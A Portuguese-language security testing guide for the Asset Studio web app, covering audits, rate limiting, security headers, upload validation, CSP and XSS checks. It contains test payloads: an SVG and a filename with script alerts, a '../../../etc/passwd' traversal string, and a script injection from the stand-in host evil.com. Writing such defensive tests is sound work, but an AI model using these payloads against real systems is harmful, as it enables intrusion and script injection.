# Guia de Testes de Segurança - Asset Studio

Este guia fornece instruções para testar as proteções de segurança implementadas no Asset Studio.

---

## 🧪 Testes Automáticos

### 1. Auditoria de Dependências

**Descrição**: Verifica vulnerabilidades conhecidas em dependências npm.

**Comando**:
```bash
npm audit
```

**Resultado Esperado**: `found 0 vulnerabilities`

**Frequência**: Antes de cada deploy

---

### 2. Teste de Rate Limiting

**Descrição**: Verifica se o rate limiting está bloqueando requisições excessivas.

**Comando**:
```bash
# Inicie o servidor de desenvolvimento
npm run dev

# Em outro terminal, execute:
node scripts/test-rate-limit.js
```

**Resultado Esperado**:
- Primeiras ~10 requisições: Status 400 ou 500 (sem arquivo válido)
- Requisições 11-15+: Status **429** (rate limited)
- Possível: Status **403** (IP bloqueado por abuso após múltiplas violações)

**Análise**: O script exibirá estatísticas. Verifique que pelo menos 5 requisições foram rate-limited.

---

### 3. Lint de Segurança (Opcional - Futuro)

**Descrição**: Analisa código para padrões inseguros.

**Setup**:
```bash
npm install --save-dev eslint-plugin-security
```

**Configuração** (`eslint.config.mjs`):
```javascript
import security from 'eslint-plugin-security';

export default [
  {
    plugins: { security },
    rules: {
      'security/detect-object-injection': 'warn',
      'security/detect-non-literal-regexp': 'warn',
    }
  }
];
```

**Comando**:
```bash
npm run lint
```

---

## 🔍 Testes Manuais

### 1. Validar Headers de Segurança

**Descrição**: Verifica que headers de segurança estão presentes e corretos.

**Etapas**:

1. Faça deploy em produção (Vercel/Netlify)
2. Acesse [securityheaders.com](https://securityheaders.com)
3. Insira sua URL de produção
4. Clique em "Scan"

**Resultado Esperado**: Score **A** ou **A+**

**Headers Obrigatórios**:
- ✅ `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- ✅ `Content-Security-Policy: ...`
- ✅ `X-Frame-Options: DENY`
- ✅ `X-Content-Type-Options: nosniff`
- ✅ `Referrer-Policy: strict-origin-when-cross-origin`
- ✅ `Cross-Origin-Embedder-Policy: require-corp`
- ✅ `Cross-Origin-Opener-Policy: same-origin`

**Screenshot**: Salve o resultado para auditoria.

---

### 2. Teste de Upload de Arquivo Malicioso

**Descrição**: Verifica que validação de arquivo previne uploads maliciosos.

#### Teste 2.1: MIME Spoofing

**Etapas**:
1. Criar arquivo `test.html` com conteúdo:
   ```html
   <!DOCTYPE html><html><body><h1>Malicious</h1></body></html>
   ```
2. Renomear para `test.jpg`
3. Tentar upload no Asset Studio
4. Verificar erro

**Resultado Esperado**: ❌ "Arquivo corrompido ou tipo de arquivo não corresponde à extensão"

#### Teste 2.2: SVG XSS

**Etapas**:
1. Criar arquivo `xss.svg` com conteúdo:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg">
     <script>alert('XSS')</script>
   </svg>
   ```
2. Tentar upload no Asset Studio
3. Verificar erro

**Resultado Esperado**: ❌ "Tipo de arquivo não permitido por motivos de segurança: .svg"

#### Teste 2.3: Arquivo Vazio

**Etapas**:
1. Criar arquivo vazio (`touch empty.png`)
2. Tentar upload
3. Verificar erro

**Resultado Esperado**: ❌ "Arquivo vazio."

#### Teste 2.4: Arquivo Excedendo Limite

**Etapas**:
1. Criar arquivo > 50MB
2. Tentar upload
3. Verificar erro

**Resultado Esperado**: ❌ "Arquivo muito grande. Tamanho máximo: 50MB"

---

### 3. Teste de CSP (Content Security Policy)

**Descrição**: Verifica que CSP está bloqueando scripts maliciosos.

**Etapas**:
1. Abrir aplicação
2. Abrir DevTools (F12) → Console
3. Executar:
   ```javascript
   const script = document.createElement('script');
   script.src = 'https://evil.com/malicious.js';
   document.body.appendChild(script);
   ```
4. Verificar erro no console

**Resultado Esperado**: Erro de CSP:
```
Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self' 'unsafe-eval' 'unsafe-inline'"
```

---

### 4. Teste de XSS (Cross-Site Scripting)

**Descrição**: Verifica que React escaping previne XSS.

**Etapas**:
1. Fazer upload de imagem com nome malicioso:
   - Renomear imagem para: `<script>alert('XSS')</script>.png`
2. Upload no Asset Studio
3. Verificar que nome é escapado/sanitizado

**Resultado Esperado**: Nome exibido como texto plano (sem execução de script)

---

### 5. Teste de Path Traversal

**Descrição**: Verifica que filenames são sanitizados.

**Teste Interno** (não exposto ao usuário final, apenas validação):

```javascript
// Em console.log ou teste unitário:
import { sanitizeFilename } from '@/lib/security/fileValidation';

console.log(sanitizeFilename('../../../etc/passwd')); 
// Esperado: "etc_passwd"

console.log(sanitizeFilename('test..file.png'));
// Esperado: "test.file.png"

console.log(sanitizeFilename('<script>alert(1)</script>.jpg'));
// Esperado: "script_alert_1__script_.jpg"
```

---

### 6. Validar HSTS Preload (Produção)

**Descrição**: Verifica conformidade com HSTS Preload requirements.

**Etapas**:
1. Aplicação deve estar em produção com HTTPS
2. Acesse [hstspreload.org](https://hstspreload.org)
3. Insira seu domínio
4. Clique em "Check HSTS preload status and eligibility"

**Resultado Esperado**: Todas as validações passam ✅

**Validações**:
- ✅ Serve a valid certificate
- ✅ Redirect from HTTP to HTTPS on same host
- ✅ Serve HSTS header on base domain (max-age ≥ 31536000)
- ✅ Include `includeSubDomains` directive
- ✅ Include `preload` directive

> **⚠️ ATENÇÃO**: Submeter para preload list é **irreversível**. Só faça após testes extensivos.

---

### 7. Teste de Rate Limiting Manual

**Descrição**: Validação manual do rate limiting via browser.

**Etapas**:
1. Abrir DevTools (F12) → Console
2. Executar:
   ```javascript
   for (let i = 0; i < 15; i++) {
       fetch('/api/remove-bg', { 
           method: 'POST', 
           body: new FormData() 
       })
       .then(r => console.log(`Request ${i+1}: ${r.status}`));
   }
   ```
3. Verificar console

**Resultado Esperado**:
- Primeiras ~10 requisições: 400 ou 500
- Requisições 11+: **429 Too Many Requests**
- Possível: **403 Forbidden** (após muitas violações)

---

## 🚀 Testes de Penetração Básicos

### OWASP ZAP (Automated Scanner)

**Descrição**: Scanner automático de vulnerabilidades web.

**Setup**:
1. Baixar [OWASP ZAP](https://www.zaproxy.org/)
2. Instalar e abrir
3. Inserir URL local ou de produção
4. Executar "Automated Scan"

**Análise**: Revisar relatório e corrigir quaisquer vulnerabilidades encontradas.

---

### Burp Suite Community (Manual Testing)

**Descrição**: Ferramenta profissional para testes de segurança.

**Testes Recomendados**:
1. **Interceptar requisições** e tentar modificar headers
2. **Manipular parâmetros** da API
3. **Testar diferentes payloads** de arquivo
4. **Verificar headers de resposta**

---

## 📊 Checklist de Validação Completa

Antes de cada release em produção:

### Segurança de Código
- [ ] `npm audit` sem vulnerabilidades críticas/altas
- [ ] Nenhum `dangerouslySetInnerHTML` no código
- [ ] Nenhum secret com `NEXT_PUBLIC_` prefix
- [ ] `.env.local` não commitado

### Headers de Segurança
- [ ] HSTS presente em produção (score A+ em securityheaders.com)
- [ ] CSP configurado e sem violações
- [ ] COEP/COOP/CORP presentes

### Upload de Arquivos
- [ ] Teste de MIME spoofing bloqueado
- [ ] Teste de SVG bloqueado
- [ ] Teste de arquivo vazio bloqueado
- [ ] Teste de arquivo >50MB bloqueado

### Rate Limiting
- [ ] Script de teste passa (≥5 requisições rate limited)
- [ ] Headers `X-RateLimit-*` presentes
- [ ] Abuse tracking funcional (403 após múltiplas violações)

### APIs
- [ ] Endpoint `/api/remove-bg` protegido
- [ ] Erros genéricos (sem stack traces)
- [ ] CORS configurado corretamente

### Documentação
- [ ] SECURITY.md atualizado
- [ ] DEPLOYMENT_SECURITY.md seguido
- [ ] README.md atualizado

---

## 📝 Relatório de Testes

Após executar os testes, documente os resultados:

```markdown
# Relatório de Testes de Segurança

**Data**: YYYY-MM-DD
**Testador**: Seu Nome
**Versão**: v1.0.0

## Testes Executados

- [x] npm audit - 0 vulnerabilidades
- [x] Rate limiting - ✅ Funcionando
- [x] Headers de segurança - ✅ Score A+
- [x] Upload malicioso - ✅ Bloqueado
- [x] CSP - ✅ Sem violações
- [x] HSTS Preload - ✅ Conformidade

## Observações

- Ambiente testado: Local / Staging / Produção
- URL: https://seu-dominio.com
- Issues encontradas: Nenhuma

## Aprovação

Status: ✅ APROVADO para produção
```

---

## 🔗 Recursos

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Security Headers](https://securityheaders.com/)
- [HSTS Preload](https://hstspreload.org/)
- [Mozilla Observatory](https://observatory.mozilla.org/)

---

**Última Atualização**: 2026-02-10
